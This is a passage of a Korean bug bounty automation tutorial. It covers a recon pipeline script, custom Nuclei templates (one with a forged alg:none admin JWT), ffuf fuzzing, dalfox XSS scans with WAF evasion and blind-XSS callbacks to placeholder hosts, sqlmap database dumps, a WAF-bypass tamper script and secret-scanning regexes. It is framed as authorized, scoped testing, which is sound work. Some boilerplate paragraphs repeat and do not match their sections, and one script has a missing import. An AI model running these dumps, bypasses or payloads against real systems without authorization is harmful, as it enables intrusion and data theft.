# 버그바운티 자동화 도구 완전 정복

## 자동화 파이프라인 개요


버그 바운티 자동화 파이프라인입니다. 서브도메인 탐색 → 포트·서비스 스캔 → 웹 취약점 스캔 → 결과 필터링 순으로 진행되며, 새로운 자산이 발견되면 알림을 보내도록 구성합니다.

```
타겟 도메인
    │
    ▼
[정찰 자동화]
subfinder + amass + assetfinder
    │
    ▼
[생존 확인]
httpx + httprobe
    │
    ▼
[스크린샷]
gowitness + eyewitness
    │
    ▼
[취약점 스캔]
nuclei + nikto + dalfox
    │
    ▼
[수동 검증]
Burp Suite + 브라우저
    │
    ▼
[보고서 작성]
```

---

## 1. 정찰 자동화 스크립트

### recon_pipeline.py — 종합 정찰 자동화 CLI


버그 바운티 자동화 파이프라인입니다. 서브도메인 탐색 → 포트·서비스 스캔 → 웹 취약점 스캔 → 결과 필터링 순으로 진행되며, 새로운 자산이 발견되면 알림을 보내도록 구성합니다.

```python
#!/usr/bin/env python3
"""
버그바운티 종합 정찰 파이프라인 — Python 3.10+
요구사항: pip install requests dnspython
외부 바이너리 (선택): subfinder, amass, naabu, nuclei, waybackurls, gau, katana, gowitness
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
import sys
import textwrap
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

import requests


# ── 유틸리티 ─────────────────────────────────────────────────────────────────

def run_tool(cmd: list[str], output_file: Optional[Path] = None,
             timeout: int = 300) -> list[str]:
    """외부 도구 실행. stdout 라인 목록 반환. 도구 없으면 빈 리스트."""
    try:
        result = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout
        )
        lines = [l.strip() for l in result.stdout.splitlines() if l.strip()]
        if output_file and lines:
            output_file.parent.mkdir(parents=True, exist_ok=True)
            output_file.write_text("\n".join(lines), encoding="utf-8")
        return lines
    except FileNotFoundError:
        print(f"[!] {cmd[0]} 없음 — 건너뜀")
        return []
    except subprocess.TimeoutExpired:
        print(f"[!] {cmd[0]} 타임아웃 — 부분 결과 사용")
        return []
    except Exception as exc:
        print(f"[!] {cmd[0]} 오류: {exc}")
        return []


def crtsh_enum(domain: str) -> list[str]:
    """crt.sh 인증서 투명성 로그 서브도메인 열거."""
    try:
        resp = requests.get(
            f"https://crt.sh/?q=%.{domain}&output=json", timeout=20
        )
        entries = resp.json()
        subs: set[str] = set()
        for entry in entries:
            for name in entry.get("name_value", "").splitlines():
                name = name.strip().lstrip("*.")
                if name.endswith(domain) and " " not in name:
                    subs.add(name)
        return sorted(subs)
    except Exception as exc:
        print(f"[!] crt.sh: {exc}")
        return []


def check_http_alive(subdomain: str) -> Optional[dict]:
    """HTTP/HTTPS 생존 확인 + 기본 정보."""
    import urllib3
    urllib3.disable_warnings()
    for scheme in ("https", "http"):
        try:
            resp = requests.get(
                f"{scheme}://{subdomain}", timeout=8, verify=False,
                allow_redirects=True, headers={"User-Agent": "Mozilla/5.0"},
            )
            t_start = resp.text.find("<title>")
            t_end = resp.text.find("</title>")
            title = resp.text[t_start + 7:t_end].strip()[:60] if t_start != -1 else ""
            return {
                "url": resp.url,
                "status": resp.status_code,
                "title": title,
                "server": resp.headers.get("Server", ""),
                "tech": resp.headers.get("X-Powered-By", ""),
            }
        except Exception:
            continue
    return None


def scan_js_secrets(js_url: str) -> list[str]:
    """JS 파일에서 민감 패턴 검색."""
    SECRET_PATTERNS = [
        r'(?i)(api[_-]?key|apikey)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})',
        r'(?i)(secret|token)\s*[:=]\s*["\']?([a-zA-Z0-9_\-]{20,})',
        r'(?i)(password|passwd)\s*[:=]\s*["\']([^"\']{6,})',
        r'(?i)aws[_\-]?access[_\-]?key[_\-]?id\s*[:=]\s*["\']?([A-Z0-9]{20})',
        r'(?i)-----BEGIN (RSA|EC|OPENSSH) PRIVATE KEY-----',
    ]
    try:
        resp = requests.get(js_url, timeout=10, verify=False,
                             headers={"User-Agent": "Mozilla/5.0"})
        findings: list[str] = []
        for pattern in SECRET_PATTERNS:
            matches = re.findall(pattern, resp.text)
            for match in matches[:3]:
                val = match[-1] if isinstance(match, tuple) else match
                findings.append(f"{js_url} → {val[:60]}")
        return findings
    except Exception:
        return []


# ── 파이프라인 단계 ───────────────────────────────────────────────────────────

@dataclass
class ReconResult:
    domain: str
    output_dir: Path
    subdomains: list[str] = field(default_factory=list)
    alive_hosts: list[dict] = field(default_factory=list)
    open_ports: list[str] = field(default_factory=list)
    urls: list[str] = field(default_factory=list)
    nuclei_results: list[str] = field(default_factory=list)
    js_secrets: list[str] = field(default_factory=list)
    start_time: str = field(default_factory=lambda: datetime.now().isoformat())


def step_subdomains(result: ReconResult, use_amass: bool = False) -> None:
    print("\n[1/6] 서브도메인 열거 중...")
    sub_dir = result.output_dir / "subdomains"
    sub_dir.mkdir(parents=True, exist_ok=True)

    all_subs: set[str] = set()

    # crt.sh
    crt = crtsh_enum(result.domain)
    all_subs.update(crt)
    print(f"    crt.sh: {len(crt)}개")

    # subfinder
    sf = run_tool(
        ["subfinder", "-d", result.domain, "-all", "-silent"],
        sub_dir / "subfinder.txt",
    )
    all_subs.update(sf)
    print(f"    subfinder: {len(sf)}개")

    # amass (선택)
    if use_amass:
        am = run_tool(
            ["amass", "enum", "-passive", "-d", result.domain],
            sub_dir / "amass.txt",
            timeout=600,
        )
        all_subs.update(am)
        print(f"    amass: {len(am)}개")

    result.subdomains = sorted(all_subs)
    (sub_dir / "all.txt").write_text(
        "\n".join(result.subdomains), encoding="utf-8"
    )
    print(f"    [+] 중복 제거 후: {len(result.subdomains)}개")


def step_alive_check(result: ReconResult, workers: int = 30) -> None:
    print("\n[2/6] HTTP 생존 확인 중...")
    import urllib3
    urllib3.disable_warnings()

    alive: list[dict] = []
    with ThreadPoolExecutor(max_workers=workers) as pool:
        futures = {pool.submit(check_http_alive, s): s for s in result.subdomains}
        for future in as_completed(futures):
            info = future.result()
            if info:
                alive.append(info)

    result.alive_hosts = sorted(alive, key=lambda h: h["url"])
    alive_dir = result.output_dir / "subdomains"
    (alive_dir / "alive.txt").write_text(
        "\n".join(h["url"] for h in alive), encoding="utf-8"
    )
    print(f"    [+] 응답 호스트: {len(alive)}개 / {len(result.subdomains)}개")


def step_port_scan(result: ReconResult) -> None:
    print("\n[3/6] 포트 스캔 중 (naabu)...")
    port_dir = result.output_dir / "ports"
    port_dir.mkdir(parents=True, exist_ok=True)

    subs_file = result.output_dir / "subdomains" / "all.txt"
    if not subs_file.exists():
        return

    ports = run_tool(
        ["naabu", "-list", str(subs_file), "-top-ports", "1000", "-silent"],
        port_dir / "open_ports.txt",
        timeout=600,
    )
    result.open_ports = ports
    print(f"    [+] 열린 포트: {len(ports)}개")


def step_url_collection(result: ReconResult) -> None:
    print("\n[4/6] URL 수집 중...")
    url_dir = result.output_dir / "urls"
    url_dir.mkdir(parents=True, exist_ok=True)

    all_urls: set[str] = set()

    # waybackurls
    wb = run_tool(
        ["waybackurls", result.domain],
        url_dir / "wayback.txt",
        timeout=180,
    )
    all_urls.update(wb)
    print(f"    waybackurls: {len(wb)}개")

    # gau
    gau = run_tool(
        ["gau", "--subs", result.domain],
        url_dir / "gau.txt",
        timeout=180,
    )
    all_urls.update(gau)
    print(f"    gau: {len(gau)}개")

    result.urls = sorted(all_urls)
    (url_dir / "all.txt").write_text("\n".join(result.urls), encoding="utf-8")
    print(f"    [+] 총 URL: {len(result.urls)}개")


def step_nuclei_scan(result: ReconResult, severity: str = "low,medium,high,critical") -> None:
    print("\n[5/6] Nuclei 취약점 스캔 중...")
    nuclei_dir = result.output_dir / "nuclei"
    nuclei_dir.mkdir(parents=True, exist_ok=True)

    alive_file = result.output_dir / "subdomains" / "alive.txt"
    if not alive_file.exists() or alive_file.stat().st_size == 0:
        print("    [!] 생존 호스트 파일 없음 — 건너뜀")
        return

    output_file = nuclei_dir / "results.jsonl"
    run_tool(
        [
            "nuclei",
            "-list", str(alive_file),
            "-j", "-o", str(output_file),
            "-severity", severity,
            "-rate-limit", "50",
            "-stats",
        ],
        timeout=900,
    )

    if output_file.exists():
        lines = [l for l in output_file.read_text().splitlines() if l.strip()]
        result.nuclei_results = lines
        print(f"    [+] Nuclei 결과: {len(lines)}개")
    else:
        print("    [!] Nuclei 결과 없음")


def step_js_secrets(result: ReconResult, max_files: int = 50) -> None:
    print("\n[6/6] JS 시크릿 탐지 중...")
    js_urls = [u for u in result.urls if u.endswith(".js")][:max_files]
    print(f"    JS 파일: {len(js_urls)}개 분석")

    all_secrets: list[str] = []
    with ThreadPoolExecutor(max_workers=10) as pool:
        futures = [pool.submit(scan_js_secrets, url) for url in js_urls]
        for future in as_completed(futures):
            all_secrets.extend(future.result())

    result.js_secrets = all_secrets
    if all_secrets:
        secrets_file = result.output_dir / "urls" / "js_secrets.txt"
        secrets_file.write_text("\n".join(all_secrets), encoding="utf-8")
        print(f"    [!] 시크릿 후보: {len(all_secrets)}개 → {secrets_file}")
    else:
        print("    [*] 시크릿 미탐지")


def save_summary(result: ReconResult) -> None:
    summary = {
        "domain": result.domain,
        "start_time": result.start_time,
        "end_time": datetime.now().isoformat(),
        "stats": {
            "subdomains": len(result.subdomains),
            "alive_hosts": len(result.alive_hosts),
            "open_ports": len(result.open_ports),
            "urls": len(result.urls),
            "nuclei_results": len(result.nuclei_results),
            "js_secrets": len(result.js_secrets),
        },
    }
    summary_file = result.output_dir / "summary.json"
    summary_file.write_text(json.dumps(summary, indent=2), encoding="utf-8")

    print(f"\n{'=' * 60}")
    print(f"  정찰 완료: {result.domain}")
    print(f"  출력 디렉토리: {result.output_dir}/")
    print(f"  서브도메인:    {summary['stats']['subdomains']}개")
    print(f"  응답 호스트:   {summary['stats']['alive_hosts']}개")
    print(f"  URL:           {summary['stats']['urls']}개")
    print(f"  Nuclei 발견:   {summary['stats']['nuclei_results']}개")
    if result.js_secrets:
        print(f"  JS 시크릿:     {summary['stats']['js_secrets']}개 [!]")
    print(f"{'=' * 60}")


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="버그바운티 종합 정찰 파이프라인",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사용 예시:
              python recon_pipeline.py -d target.com
              python recon_pipeline.py -d target.com --amass --no-ports
              python recon_pipeline.py -d target.com -o ./recon/ -w 50
              python recon_pipeline.py -d target.com --nuclei-severity critical,high
            """
        ),
    )
    parser.add_argument("-d", "--domain", required=True, help="대상 도메인")
    parser.add_argument("-o", "--output", type=Path, default=None, help="출력 디렉토리")
    parser.add_argument("-w", "--workers", type=int, default=30, help="병렬 스레드 수")
    parser.add_argument("--amass", action="store_true", help="amass 포함 (느림)")
    parser.add_argument("--no-ports", action="store_true", help="포트 스캔 건너뜀")
    parser.add_argument("--no-urls", action="store_true", help="URL 수집 건너뜀")
    parser.add_argument("--no-nuclei", action="store_true", help="Nuclei 스캔 건너뜀")
    parser.add_argument("--no-js", action="store_true", help="JS 분석 건너뜀")
    parser.add_argument(
        "--nuclei-severity", default="low,medium,high,critical",
        help="Nuclei 심각도 필터",
    )
    args = parser.parse_args()

    out_dir = args.output or Path(f"recon_{args.domain}_{datetime.now().strftime('%Y%m%d_%H%M%S')}")
    out_dir.mkdir(parents=True, exist_ok=True)

    result = ReconResult(domain=args.domain, output_dir=out_dir)

    step_subdomains(result, use_amass=args.amass)
    step_alive_check(result, workers=args.workers)

    if not args.no_ports:
        step_port_scan(result)
    if not args.no_urls:
        step_url_collection(result)
    if not args.no_nuclei:
        step_nuclei_scan(result, severity=args.nuclei_severity)
    if not args.no_js and result.urls:
        step_js_secrets(result)

    save_summary(result)


if __name__ == "__main__":
    main()
```

---

## 2. Nuclei 고급 활용

### 기본 사용법

```bash
# 특정 타겟 스캔
nuclei -u https://target.com -t nuclei-templates/

# 다중 타겟
nuclei -list targets.txt -t nuclei-templates/

# 심각도별 필터
nuclei -u https://target.com -severity critical,high

# 태그 필터
nuclei -u https://target.com -tags xss,sqli,ssrf

# CVE 스캔
nuclei -u https://target.com -tags cve

# 인증 포함
nuclei -u https://target.com \
       -H "Authorization: Bearer eyJ..." \
       -H "Cookie: session=abc123"

# 속도 제한
nuclei -u https://target.com -rl 10 -bs 5  # 10req/s, 5 bulk

# 출력 형식
nuclei -u https://target.com -j -o results.json  # JSON
nuclei -u https://target.com -markdown-export ./report/
```

### 커스텀 Nuclei 템플릿 작성

YAML 설정 파일입니다. 쿠버네티스, CI/CD 파이프라인, 보안 도구 설정에 널리 사용되며 잘못된 설정이 보안 취약점으로 이어질 수 있습니다.

```yaml
# custom_idor.yaml - IDOR 탐지 템플릿
id: custom-idor-detection

info:
  name: IDOR via User ID Parameter
  author: bugbounty-hunter
  severity: high
  description: Tests for Insecure Direct Object Reference via id parameter
  tags: idor,generic

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/user?id=1"
      - "{{BaseURL}}/api/user?id=2"
      - "{{BaseURL}}/profile?user_id=1"
    
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "email"
          - "username"
          - "password"
        condition: or
      - type: dsl
        dsl:
          - "len(body) > 100"
```

YAML 설정 파일입니다. 쿠버네티스, CI/CD 파이프라인, 보안 도구 설정에 널리 사용되며 잘못된 설정이 보안 취약점으로 이어질 수 있습니다.

```yaml
# jwt_none_alg.yaml - JWT alg:none 탐지
id: jwt-none-algorithm

info:
  name: JWT Algorithm None Vulnerability  
  severity: critical
  tags: jwt,auth

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/protected"
    
    headers:
      Authorization: "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."

    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "admin"
          - "protected"
```

YAML 설정 파일입니다. 쿠버네티스, CI/CD 파이프라인, 보안 도구 설정에 널리 사용되며 잘못된 설정이 보안 취약점으로 이어질 수 있습니다.

```yaml
# exposed_git.yaml - .git 디렉토리 노출
id: exposed-git-directory

info:
  name: Exposed .git Directory
  severity: high
  tags: exposure,git,config

http:
  - method: GET
    path:
      - "{{BaseURL}}/.git/HEAD"
      - "{{BaseURL}}/.git/config"
      - "{{BaseURL}}/.git/COMMIT_EDITMSG"

    matchers:
      - type: word
        words:
          - "ref: refs/"
          - "[core]"
          - "repositoryformatversion"
        condition: or
```

### Nuclei 템플릿 라이브러리 관리

```bash
# 템플릿 업데이트
nuclei -update-templates

# 커스텀 템플릿 디렉토리
nuclei -u target.com -t ~/custom-templates/ -t ~/nuclei-templates/

# 템플릿 검색
nuclei -tl | grep "xss"      # XSS 관련 템플릿 목록
nuclei -tl | grep "cve-2023" # 2023년 CVE 목록

# 통계 확인
nuclei -u target.com -stats -silent
```

---

## 3. ffuf 완전 정복

### 디렉토리/파일 퍼징

```bash
# 기본 디렉토리 브루트포스
ffuf -u https://target.com/FUZZ \
     -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -c -v

# 확장자 퍼징
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -e .php,.asp,.aspx,.jsp,.txt,.bak \
     -c

# 필터링 (크기/코드별)
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -fc 404          # 404 제외
     -fs 1234         # 크기 1234 제외
     -fw 10           # 단어 수 10 제외
     -fl 25           # 라인 수 25 제외

# 속도 제한
ffuf -u https://target.com/FUZZ \
     -w wordlist.txt \
     -rate 100        # 초당 100 요청
     -t 50            # 50 스레드
```

### 파라미터 퍼징

```bash
# GET 파라미터 발견
ffuf -u "https://target.com/page?FUZZ=test" \
     -w params.txt \
     -fs 1234         # 기본 응답 크기 필터

# POST 파라미터 퍼징
ffuf -u https://target.com/login \
     -X POST \
     -d "username=admin&FUZZ=test" \
     -w params.txt \
     -H "Content-Type: application/x-www-form-urlencoded"

# JSON 파라미터 퍼징
ffuf -u https://target.com/api \
     -X POST \
     -d '{"FUZZ":"test"}' \
     -H "Content-Type: application/json" \
     -w params.txt

# 다중 위치 퍼징 (CLUSTERBOMB)
ffuf -u "https://target.com/FUZZ1/FUZZ2" \
     -w wordlist1.txt:FUZZ1 \
     -w wordlist2.txt:FUZZ2
```

### Virtual Host 발견

```bash
# 서브도메인/vhost 발견
ffuf -u https://target.com/ \
     -H "Host: FUZZ.target.com" \
     -w subdomains.txt \
     -fs $(curl -s -o /dev/null -w '%{size_download}' https://target.com/)
```

---

## 4. dalfox - XSS 자동화


버그 바운티 자동화 파이프라인입니다. 서브도메인 탐색 → 포트·서비스 스캔 → 웹 취약점 스캔 → 결과 필터링 순으로 진행되며, 새로운 자산이 발견되면 알림을 보내도록 구성합니다.

```bash
# 기본 스캔
dalfox url "https://target.com/search?q=test"

# 파라미터 지정
dalfox url "https://target.com/search?q=test" -p q

# 파이프 입력
echo "https://target.com/search?q=test" | dalfox pipe

# URL 리스트 파일
dalfox file urls.txt

# 헤더 포함
dalfox url "https://target.com/" \
           --cookie "session=abc123" \
           --header "Authorization: Bearer eyJ..."

# Blind XSS (콜백 서버)
dalfox url "https://target.com/search?q=test" \
           -b "https://your-callback.com/xss"

# WAF 우회 모드
dalfox url "https://target.com/search?q=test" \
           --waf-evasion

# 출력 저장
dalfox url "https://target.com/" \
           -o results.txt --format json
```

### dalfox + 파이프라인 연동

```bash
# URL 수집 후 자동 XSS 스캔
cat all_urls.txt | \
    grep "=" | \
    grep -v "\\.css\|\.js\|\.jpg\|\.png" | \
    dalfox pipe --silence

# gau + dalfox 연동
gau target.com | \
    grep "=" | \
    dalfox pipe -b "https://your-xss-hunter.com"
```

---

## 5. SQLMap 고급 활용

SQLMap으로 SQL 인젝션 취약점을 자동으로 탐지하고 익스플로잇합니다. --dbs, --tables, --dump 옵션으로 데이터베이스 내용을 추출할 수 있습니다.

```bash
# 기본 스캔
sqlmap -u "https://target.com/page?id=1" --batch

# POST 요청
sqlmap -u "https://target.com/login" \
       --data="username=admin&password=test" \
       --batch

# 쿠키 기반 인젝션
sqlmap -u "https://target.com/page" \
       --cookie="user_id=1; session=abc" \
       -p user_id \
       --batch

# 헤더 기반 인젝션
sqlmap -u "https://target.com/" \
       -H "X-User-ID: 1" \
       -p "X-User-ID" \
       --batch

# WAF 우회 (tamper 스크립트)
sqlmap -u "https://target.com/?id=1" \
       --tamper=space2comment,between,randomcase \
       --batch

# DB 덤프 (허가된 환경)
sqlmap -u "https://target.com/?id=1" \
       --dbs \
       -D webapp \
       --tables \
       -T users \
       --dump \
       --batch

# Burp 요청 파일 사용
sqlmap -r request.txt --batch --level 5 --risk 3

# 시간 기반 SQLi (느린 환경)
sqlmap -u "https://target.com/?id=1" \
       --technique=T \
       --time-sec=10 \
       --batch
```

### SQLMap Tamper 스크립트 커스텀

```python
# custom_tamper.py
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.NORMAL

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    WAF 우회: 공백을 /**/ 로 변환 + 대소문자 랜덤화
    """
    import random
    
    result = ""
    for char in payload:
        if char == " ":
            result += "/**/"
        elif char.isalpha():
            result += char.upper() if random.random() > 0.5 else char.lower()
        else:
            result += char
    return result
```

---

## 6. 시크릿 탐지 자동화

### GitLeaks

```bash
# 로컬 저장소 스캔
gitleaks detect --source=./repo --report-path=leaks.json

# GitHub 원격 저장소 스캔
gitleaks detect --source=https://github.com/user/repo \
                --report-path=leaks.json

# 커밋 히스토리 스캔
gitleaks detect --source=. --log-opts="HEAD~50..HEAD"

# 커스텀 규칙
gitleaks detect --config=custom_rules.toml
```

```toml
# custom_rules.toml
[extend]
useDefault = true

[[rules]]
id = "custom-api-key"
description = "Custom API Key"
regex = '''(?i)(api_key|apikey|api-key)\s*[:=]\s*['""]?[a-z0-9]{32,}['""]?'''
tags = ["api", "key"]
```

### TruffleHog

```bash
# GitHub 스캔
trufflehog github --repo=https://github.com/user/repo

# 파일시스템 스캔
trufflehog filesystem --path=./code

# S3 버킷 스캔
trufflehog s3 --bucket=my-bucket

# 검증 포함 (실제 유효한 시크릿만)
trufflehog github --repo=... --only-verified
```

---

## 7. 스코프 관리 및 자동화

### scope_manager.py — 버그바운티 스코프 관리 CLI

```python
#!/usr/bin/env python3
"""
버그바운티 스코프 관리 CLI — HackerOne / Bugcrowd 프로그램 스코프 관리
요구사항: Python 3.10+ 표준 라이브러리만 사용
"""

from __future__ import annotations

import argparse
import json
import re
import sys
import textwrap
from dataclasses import dataclass, field
from pathlib import Path
from typing import Literal
from urllib.parse import urlparse


# ── 데이터 모델 ───────────────────────────────────────────────────────────────

ScopeType = Literal["in", "out"]

SCOPE_TYPE_MAP = {
    "web_application": "웹 애플리케이션",
    "api": "API",
    "mobile": "모바일 앱",
    "other": "기타",
}


@dataclass
class ScopeEntry:
    pattern: str        # *.target.com, 192.168.1.0/24, https://app.target.com 등
    scope_type: ScopeType
    category: str = "web_application"
    note: str = ""

    def matches(self, target: str) -> bool:
        """패턴이 대상 URL/도메인/IP와 일치하는지 확인."""
        # URL에서 호스트 추출
        parsed = urlparse(target)
        host = parsed.netloc or parsed.path
        host = host.split(":")[0]  # 포트 제거

        pattern = self.pattern.lstrip("*.")

        if self.pattern.startswith("*."):
            # 와일드카드 서브도메인: *.target.com
            return host == pattern or host.endswith("." + pattern)
        elif "/" in self.pattern and not self.pattern.startswith("http"):
            # CIDR 범위
            return self._cidr_match(host, self.pattern)
        elif self.pattern.startswith("http"):
            # URL 정확 매칭 또는 접두사 매칭
            return target.startswith(self.pattern)
        else:
            # 도메인 정확 매칭
            return host == self.pattern or host.endswith("." + self.pattern)

    @staticmethod
    def _cidr_match(ip: str, cidr: str) -> bool:
        try:
            import ipaddress
            return ipaddress.ip_address(ip) in ipaddress.ip_network(cidr, strict=False)
        except ValueError:
            return False


@dataclass
class ScopeManager:
    program: str
    platform: str = "hackerone"
    entries: list[ScopeEntry] = field(default_factory=list)
    _path: Path = field(init=False)

    def __post_init__(self) -> None:
        self._path = Path(f"scope_{self.program}.json")

    # ── 스코프 관리 ──────────────────────────────────────────────────────────

    def add(self, pattern: str, scope_type: ScopeType = "in",
            category: str = "web_application", note: str = "") -> None:
        # 중복 방지
        for e in self.entries:
            if e.pattern == pattern and e.scope_type == scope_type:
                print(f"[!] 이미 존재: {scope_type}:{pattern}")
                return
        self.entries.append(ScopeEntry(pattern, scope_type, category, note))
        self.save()
        print(f"[+] 추가: [{scope_type}] {pattern}")

    def remove(self, pattern: str) -> bool:
        before = len(self.entries)
        self.entries = [e for e in self.entries if e.pattern != pattern]
        if len(self.entries) < before:
            self.save()
            print(f"[+] 제거: {pattern}")
            return True
        print(f"[-] 미발견: {pattern}")
        return False

    def is_in_scope(self, target: str) -> tuple[bool, Optional[ScopeEntry]]:
        """스코프 내 여부 확인. (in_scope, 매칭된 항목)"""
        # out-of-scope 먼저 확인
        for entry in self.entries:
            if entry.scope_type == "out" and entry.matches(target):
                return False, entry

        # in-scope 확인
        for entry in self.entries:
            if entry.scope_type == "in" and entry.matches(target):
                return True, entry

        return False, None

    # ── 필터링 ───────────────────────────────────────────────────────────────

    def filter_file(self, input_path: Path, output_path: Optional[Path] = None) -> list[str]:
        """파일의 URL/도메인 목록에서 스코프 내 항목만 추출."""
        lines = input_path.read_text(encoding="utf-8").splitlines()
        in_scope: list[str] = []
        out_scope: list[str] = []

        for line in lines:
            line = line.strip()
            if not line:
                continue
            result, _ = self.is_in_scope(line)
            if result:
                in_scope.append(line)
            else:
                out_scope.append(line)

        if output_path:
            output_path.write_text("\n".join(in_scope), encoding="utf-8")
            print(f"[+] 스코프 내: {len(in_scope)}개 → {output_path}")

        print(f"    전체: {len(lines)} | 스코프 내: {len(in_scope)} | 제외: {len(out_scope)}")
        return in_scope

    # ── 직렬화 ───────────────────────────────────────────────────────────────

    def save(self) -> None:
        data = {
            "program": self.program,
            "platform": self.platform,
            "entries": [
                {"pattern": e.pattern, "type": e.scope_type,
                 "category": e.category, "note": e.note}
                for e in self.entries
            ],
        }
        self._path.write_text(json.dumps(data, ensure_ascii=False, indent=2), encoding="utf-8")

    @classmethod
    def load(cls, path: Path) -> "ScopeManager":
        data = json.loads(path.read_text(encoding="utf-8"))
        mgr = cls(program=data["program"], platform=data.get("platform", "hackerone"))
        mgr._path = path
        for e in data.get("entries", []):
            mgr.entries.append(ScopeEntry(
                pattern=e["pattern"],
                scope_type=e["type"],
                category=e.get("category", "web_application"),
                note=e.get("note", ""),
            ))
        return mgr

    def show(self) -> None:
        in_scope = [e for e in self.entries if e.scope_type == "in"]
        out_scope = [e for e in self.entries if e.scope_type == "out"]
        print(f"\n프로그램: {self.program} ({self.platform})")
        print(f"\n  IN-SCOPE ({len(in_scope)}개):")
        for e in in_scope:
            note = f"  # {e.note}" if e.note else ""
            print(f"    {e.pattern:<50} [{e.category}]{note}")
        if out_scope:
            print(f"\n  OUT-OF-SCOPE ({len(out_scope)}개):")
            for e in out_scope:
                print(f"    {e.pattern}")
        print()


# ── CLI ───────────────────────────────────────────────────────────────────────

def main() -> None:
    parser = argparse.ArgumentParser(
        description="버그바운티 스코프 관리 CLI",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent(
            """
            사용 예시:
              # 새 프로그램 초기화 및 스코프 추가
              python scope_manager.py init -p my_program --platform hackerone
              python scope_manager.py add -p my_program *.target.com
              python scope_manager.py add -p my_program status.target.com --out
              python scope_manager.py add -p my_program 10.0.0.0/24 --category api

              # 스코프 확인
              python scope_manager.py show -p my_program
              python scope_manager.py check -p my_program https://api.target.com/v1/users

              # URL 필터링
              python scope_manager.py filter -p my_program --input all_urls.txt --output in_scope.txt
            """
        ),
    )
    sub = parser.add_subparsers(dest="cmd", required=True)

    # init
    p_init = sub.add_parser("init", help="프로그램 초기화")
    p_init.add_argument("-p", "--program", required=True)
    p_init.add_argument("--platform", default="hackerone",
                        choices=["hackerone", "bugcrowd", "intigriti", "synack", "custom"])

    # add
    p_add = sub.add_parser("add", help="스코프 항목 추가")
    p_add.add_argument("-p", "--program", required=True)
    p_add.add_argument("pattern", help="도메인/CIDR/URL 패턴")
    p_add.add_argument("--out", action="store_true", help="out-of-scope로 추가")
    p_add.add_argument("--category", default="web_application",
                       choices=list(SCOPE_TYPE_MAP.keys()))
    p_add.add_argument("--note", default="")

    # remove
    p_rm = sub.add_parser("remove", help="스코프 항목 제거")
    p_rm.add_argument("-p", "--program", required=True)
    p_rm.add_argument("pattern")

    # show
    p_show = sub.add_parser("show", help="스코프 목록 출력")
    p_show.add_argument("-p", "--program", required=True)

    # check
    p_check = sub.add_parser("check", help="단일 대상 스코프 확인")
    p_check.add_argument("-p", "--program", required=True)
    p_check.add_argument("target", help="확인할 URL/도메인")

    # filter
    p_filter = sub.add_parser("filter", help="파일에서 스코프 내 항목 추출")
    p_filter.add_argument("-p", "--program", required=True)
    p_filter.add_argument("--input", type=Path, required=True)
    p_filter.add_argument("--output", type=Path, default=None)

    args = parser.parse_args()

    def load_or_exit(program: str) -> ScopeManager:
        path = Path(f"scope_{program}.json")
        if not path.exists():
            sys.exit(f"[-] 프로그램 파일 없음: {path}\n    먼저 'init' 명령 실행")
        return ScopeManager.load(path)

    if args.cmd == "init":
        mgr = ScopeManager(program=args.program, platform=args.platform)
        mgr.save()
        print(f"[+] 초기화 완료: scope_{args.program}.json")

    elif args.cmd == "add":
        mgr = load_or_exit(args.program)
        mgr.add(
            pattern=args.pattern,
            scope_type="out" if args.out else "in",
            category=args.category,
            note=args.note,
        )

    elif args.cmd == "remove":
        mgr = load_or_exit(args.program)
        mgr.remove(args.pattern)

    elif args.cmd == "show":
        mgr = load_or_exit(args.program)
        mgr.show()

    elif args.cmd == "check":
        mgr = load_or_exit(args.program)
        in_scope, matched = mgr.is_in_scope(args.target)
        if in_scope:
            print(f"[+] IN-SCOPE: {args.target}")
            if matched:
                print(f"    매칭 패턴: {matched.pattern} ({matched.category})")
        else:
            status = "OUT-OF-SCOPE" if matched else "스코프 미정의"
            print(f"[-] {status}: {args.target}")
            if matched:
                print(f"    차단 패턴: {matched.pattern}")

    elif args.cmd == "filter":
        mgr = load_or_exit(args.program)
        out_path = args.output or args.input.with_suffix(".scoped.txt")
        mgr.filter_file(args.input, out_path)


if __name__ == "__main__":
    main()
```

---

## 8. 버그 트리아지 자동화


버그 바운티 자동화 파이프라인입니다. 서브도메인 탐색 → 포트·서비스 스캔 → 웹 취약점 스캔 → 결과 필터링 순으로 진행되며, 새로운 자산이 발견되면 알림을 보내도록 구성합니다.

```python
#!/usr/bin/env python3
"""
Nuclei 결과 파서 + 자동 트리아지 + Markdown/JSON 보고서 생성기
요구사항: pip install jinja2 requests
사용: nuclei -u targets.txt -j -o results.jsonl 로 JSONL 출력 생성 후 이 도구 실행
"""

from __future__ import annotations

import argparse
import json
import sys
import textwrap
from collections import Counter, defaultdict
from dataclasses import dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Optional

try:
    from jinja2 import Environment, BaseLoader
except ImportError:
    sys.exit("[-] pip install jinja2")


# ── 데이터 모델 ───────────────────────────────────────────────────────────────

SEVERITY_ORDER = ["critical", "high", "medium", "low", "info", "unknown"]


@dataclass
class NucleiIssue:
    template_id: str
    name: str
    severity: str
    host: str
    matched_at: str
    tags: list[str]
    description: str
    cvss_score: float
    cve_id: str
    curl_command: str
    extractor_data: dict
    raw: dict = field(default_factory=dict, repr=False)

    @property
    def severity_rank(self) -> int:
        return SEVERITY_ORDER.index(self.severity) if self.severity in SEVERITY_ORDER else 99

    def dedup_key(self) -> str:
        return f"{self.template_id}:{self.host}:{self.matched_at}"

    def is_false_positive_candidate(self) -> bool:
